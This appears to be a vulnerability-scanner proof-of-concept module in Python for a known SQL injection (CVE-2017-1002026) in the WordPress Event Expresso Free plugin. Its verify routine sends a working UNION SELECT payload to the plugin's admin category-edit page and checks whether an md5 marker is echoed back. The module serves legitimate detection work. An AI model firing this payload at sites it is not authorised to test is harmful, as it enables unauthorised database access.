# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CNVD-2017-31161' # 平台漏洞编号
    name = 'WordPress Event Expresso Free SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2017-10-24'  # 漏洞公布时间
    desc = '''
    WordPress Event Expresso Free 3.1.37.11.L版本中存在SQL注入漏洞，该漏洞源于‘edit_event_category’函数未能过滤用户提交的输入。远程攻击者借助‘$id’参数利用该漏洞执行任意的SQL命令。 
    ''' # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-31161' #
    cnvd_id = 'CNVD-2017-31161' # cnvd漏洞编号
    cve_id = 'CVE-2017-1002026'  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = 'WordPress Event Expresso Free 3.1.37.11.L'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '74719f73-db29-4416-8b9c-374d9fd41f93' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/wp-admin/admin.php?page=event_categories&action=edit&id=-7749 UNION ALL SELECT 22,22,22,md5(233),22,22,22#"
            
            vul_url = arg + payload
            headers = {
                'Content-Type':'application/x-www-form-urlencoded',
                'Cookie':self.get_option('cookie')
            }
            response = requests.get(vul_url,headers=headers)
            if response.status_code ==200 and 'e165421110ba03099a1c0393373c5b43' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()